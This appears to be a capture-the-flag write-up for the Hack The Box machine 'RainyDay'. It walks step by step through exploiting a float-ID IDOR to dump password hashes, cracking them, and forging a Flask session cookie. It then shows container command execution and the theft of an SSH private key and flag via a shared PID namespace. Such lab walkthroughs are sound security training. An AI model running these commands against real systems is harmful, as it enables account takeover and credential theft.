## Overview

RainyDay is a hard-difficulty Linux box centred on a Docker-container management web app. The path to the user flag is a clean chain of three web/container bugs: an IDOR that leaks password hashes, a forged Flask session cookie that impersonates another user, and a container started with a shared PID namespace that lets us read the host filesystem from inside the container. This post covers recon through `user.txt`.

Realistic container box where a float type-confusion IDOR, a forged Flask session, and a shared-PID-namespace host escape form an unusual custom primitive chain with no named CVE.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | key auth |
| 80   | nginx   | RainyCloud app; vhost `dev.rainycloud.htb` (IP-filtered) |

```bash
nmap -sC -sV 10.129.228.65
echo "10.129.228.65 rainycloud.htb dev.rainycloud.htb" | sudo tee -a /etc/hosts
```

The main site advertises a container service ("create and run a Docker container"), hints at a REST API, and shows a running `secrets` container owned by user `jack`. Registration is disabled — so the API is the way in.

## Enumeration

Directory and vhost brute-forcing surface an `/api` endpoint and the `dev` vhost:

```bash
gobuster dir -u http://rainycloud.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
ffuf -u "http://rainycloud.htb" -H "Host: FUZZ.rainycloud.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
```

`/api` lists endpoints including `/api/user/<id>`. Visiting `/api/user/1` errors, and SQL-injection payloads go nowhere — the endpoint expects an integer.

## Foothold

### 1 — IDOR via float type-confusion

The `id` is validated as an integer, but a *float* slips past the check while still resolving a record — and the per-record authorization is missing. Passing `1.0` dumps the whole user table:

```bash
curl -s http://rainycloud.htb/api/user/1.0
# {"password":"$2a$10$bit.DrTClexd4...","username":"jack"}
# {"password":"$2a$05$FESATmlY4G7z...","username":"root"}
# {"password":"$2b$12$WTik5.ucdomZ...","username":"gary"}
```

Crack the hashes — gary's (cost 12) falls to `rockyou`:

```bash
# requires: /usr/share/wordlists/rockyou.txt
john hashes --wordlist=/usr/share/wordlists/rockyou.txt   # gary -> <redacted>
```

`gary:<redacted>` logs into the web app.

### 2 — Forge a Flask session for jack

The app's `session` cookie is a signed Flask cookie. Once the `SECRET_KEY` is recovered (it lives in the app's `secrets.py`, reachable through the internal API), any identity can be forged. Verify the key against a live cookie, then sign one for `jack`:

```bash
flask-unsign --unsign --cookie '<live_session_cookie>' -w <(echo '<secret_key>')   # verifies
flask-unsign -s --secret '<secret_key>' --cookie '{"username": "jack"}'            # forge
```

Dropping the forged cookie grants access to jack's `secrets` container.

### 3 — Container command execution

The container UI's `action()` function (in `js/containers.js`) POSTs to `/containers` with `action=exec<COMMAND>` and the container id. That is direct command execution inside the container:

```bash
curl -s --resolve rainycloud.htb:80:10.129.228.65 -b "session=<forged_cookie>" \
  -X POST http://rainycloud.htb/containers \
  --data-urlencode 'action=execid' --data 'id=<container_id>'
# uid=1000 gid=1000
```

### 4 — Shared-PID escape to the host home

The container runs with a shared host PID namespace, so host processes appear inside it and their `/proc/<pid>/cwd` links reach the host filesystem. Find the process whose cwd is `/home/jack`:

```bash
curl -s -b "session=<forged_cookie>" -X POST http://rainycloud.htb/containers \
  --data-urlencode "action=execsh -c 'for p in /proc/[0-9]*; do ls \$p/cwd/.ssh/id_rsa >/dev/null 2>&1 && echo \$p; done'" \
  --data 'id=<container_id>'
# /proc/1191
```

That cwd holds jack's SSH key and the user flag:

```bash
curl -s -b "session=<forged_cookie>" -X POST http://rainycloud.htb/containers \
  --data-urlencode "action=execcat /proc/1191/cwd/.ssh/id_rsa" --data 'id=<container_id>' > id_rsa
```

## User flag

```bash
curl -s -b "session=<forged_cookie>" -X POST http://rainycloud.htb/containers \
  --data-urlencode "action=execcat /proc/1191/cwd/user.txt" --data 'id=<container_id>'   # HTB{...}
```

The user flag is read straight off the host through the shared PID namespace, and jack's SSH key gives a stable host shell.

Privilege escalation is left as an exercise.
